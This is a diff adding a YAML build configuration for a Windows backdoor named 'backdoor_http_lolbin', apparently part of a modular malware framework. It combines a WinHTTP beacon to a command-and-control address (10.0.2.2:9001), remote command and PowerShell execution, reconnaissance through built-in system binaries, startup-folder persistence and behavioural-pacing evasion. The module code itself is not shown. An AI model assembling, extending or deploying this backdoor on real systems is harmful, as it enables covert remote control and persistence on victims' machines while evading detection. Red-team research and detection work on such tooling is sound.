@@ -1,0 +1,27 @@
+name: backdoor_http_lolbin
+description: WinHTTP backdoor — LOLBin commands
+
+core:
+  - core/emit_buffer
+  - core/file_ops
+  - core/run_cmd
+
+c2: c2/winhttp_beacon
+
+commands:
+  - commands/cmd_exec
+  - commands/cmd_exec_powershell
+  - commands/cmd_sysinfo_lolbin
+  - commands/cmd_processes_lolbin
+  - commands/cmd_netinfo_lolbin
+
+arch: arch/backdoor
+persist: persist/startup_folder
+
+evasion:
+  - evasion/behavioral_pacing
+
+vars:
+  C2_IP: "10.0.2.2"
+  C2_PORT: "9001"
+  BEACON_INTERVAL_MS: "30000"
